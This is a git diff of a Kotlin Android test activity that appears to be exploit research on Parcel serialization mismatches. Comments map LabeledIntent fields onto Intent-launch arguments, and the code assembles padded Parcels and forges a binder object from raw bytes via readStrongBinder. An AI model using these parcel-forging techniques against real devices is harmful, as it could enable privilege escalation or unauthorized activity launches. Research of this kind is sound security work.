@@ -1,9 +1,8 @@
 package play.ground
 
 import android.app.ActivityOptions
-import android.app.ProfilerInfo
+import android.content.Intent.FLAG_ACTIVITY_NEW_TASK
 import android.os.Bundle
-import android.os.IBinder
 import android.os.Parcel
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
@@ -11,8 +10,10 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import org.jetbrains.anko.button
 import org.jetbrains.anko.sdk27.coroutines.onClick
-import org.jetbrains.anko.toast
 import org.jetbrains.anko.verticalLayout
+import java.nio.ByteBuffer
+
+fun UInt.repeat(n: Int) = UByteArray(n) { this.toUByte() }
 
 class IndexActivity : AppCompatActivity() {
   companion object {
@@ -26,7 +27,8 @@ class IndexActivity : AppCompatActivity() {
       button("Caption") {
         onClick {
           launch(Dispatchers.IO) {
-            obfuscation()
+//            obfuscation()
+            binder()
           }
         }
       }
@@ -61,13 +63,38 @@ class IndexActivity : AppCompatActivity() {
     /* writer side of `LabeledIntent`
     ```java
       dest.writeString(mSourcePackage); (String -> resolvedType)
-      dest.writeInt(mLabelRes); ( 0 -> resultTo)
-      // TextUtils.writeToParcel(mNonLocalizedLabel, dest, parcelableFlags);
-        {
-          writeInt(1)
-          writeString8(string)
-        }
-      dest.writeInt(mIcon)
+      dest.writeInt(mLabelRes); ( 0 -> resultTo -> binder.hdr) -> B_PACK_CHARS('s', 'b','*', 0x85)
+
+      // mNonLocalizedLabel (case 1)
+      {
+      val kind = readInt() -> binder.flags => 19 (dummy 19), [0x19000000]
+      val string = readString8()  // (binder | handler) @u64 => [0x00000000, 0x00000000]
+      val kind = readInt() // first byte of cookie (0) => []
+      }
+
+      // mNonLocalizedLabel (case 2)
+      {
+      val kind = readInt() // binder.flags = 1 =
+      val cs = readString8() [binder(len@i32, ?), cookie(?, ?), representation(i32),
+            ,
+            ,
+            string, int, int, null,
+            start-of-bundle, ...  ,  ,nil, padding ]
+      }
+
+      key =>
+        "foobar"
+
+      value =>
+        dest.writeInt(mIcon)            // 4 (0)
+
+        dest.writeString(resolvedType)  // 4 (-1)
+        dest.writeStrongBinder(7 * 4)   // 28 resultTo
+        dest.writeString(resultWho)     // 4 (0xFFFFFFFF)
+        dest.writeInt(requestCode)      // 4 (0)
+        dest.writeInt(flags)            // 4 (0)
+        dest.writeParcelable(null)      // 4 (0) profilerInfo
+        dest.writeParcelable(null)      // 4 (0) options
      ```
     */
 
@@ -89,10 +116,14 @@ class IndexActivity : AppCompatActivity() {
      ```
      */
 
+    val ceiling = Parcel.obtain().apply {
 
-    val bytes = Parcel.obtain().apply {
+    }
+
+    val middle = Parcel.obtain().apply {
       val mIcon = 0
       writeInt(mIcon)
+
       val resolvedType = null
       writeString(resolvedType)
 
@@ -101,20 +132,72 @@ class IndexActivity : AppCompatActivity() {
 
       val resultWho = null
       writeString(resultWho)
-      val requestCode = 0
+
+      val requestCode = -1
       writeInt(requestCode)
-      val flags = 0
+
+      val flags = FLAG_ACTIVITY_NEW_TASK
       writeInt(flags)
+
       val profilerInfo = null
       writeTypedObject(profilerInfo, 0)
       val options = ActivityOptions.makeBasic().toBundle()
       writeTypedObject(options, 0)
     }
 
+    Log.e(TAG, "${middle.dataPosition()} == 260")
 
 
-    Log.e(TAG, "${bytes.dataPosition()}")
+    val floor = Parcel.obtain().apply {
+      val mIcon = 0 // LabeledIntent.mIcon
+      writeInt(mIcon)
+
+      val resolvedType = null
+      writeString(resolvedType)
+
+      val resultTo = null
+      writeStrongBinder(resultTo)
+
+      val resultWho = null
+      writeString(resultWho)
+
+      val requestCode = 2 // 如果把 `resultTo` 改成 null, requestCode 需要为 -1
+      writeInt(requestCode)
+
+      val flags = 0 // 0x10000000 NEW_TASK
+      writeInt(flags)
+
+      val profilerInfo = null
+      writeTypedObject(profilerInfo, 0)
+
+      val bundle = null
+      writeTypedObject(bundle, 0)
+    }
+    Log.e(TAG, "floor: size: ${floor.dataPosition()} == 56")
   }
+
+
+  fun binder() {
+    val binderHead = ubyteArrayOf(
+//      1u, 0u, 0u, 0u, // Span.type(1) -> binder.flags
+      3u, 2u, 1u, 0u // String.length(?) -> binder.1@i32
+    )
+
+    val binderTail = ubyteArrayOf(
+      0u, 0u, 0u, 0u, // Span.str.payload.0123 -> binder.2@i32
+      *0u.repeat(8), // Span.str.payload.4567_8901 ->  cookie@i64
+      *0u.repeat(4), // Span.str.payload2.2345 -> representation
+    )
+
+
+    val parcel = Parcel.obtain()
+    parcel.writeByteArray((binderHead + binderTail).toByteArray())
+    parcel.setDataPosition(0)
+    val binder = parcel.readStrongBinder()
+    Log.e(TAG, "binder: $binder")
+
+  }
+
 
   // key =>
   // (260 header) + bytes = > form to entry
